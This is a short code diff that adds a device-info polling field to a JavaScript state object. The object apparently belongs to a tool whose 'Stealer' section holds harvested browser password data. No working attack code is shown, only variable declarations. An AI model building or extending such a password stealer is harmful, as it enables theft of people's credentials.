@@ -21,6 +21,9 @@ export const state = {
     scanInterval: null,
     lastScanDataJson: "",
 
+    // Device Info
+    deviceInfoInterval: null,
+
     // Stealer
     currentPasswordData: [],
     currentBrowserName: "unknown",
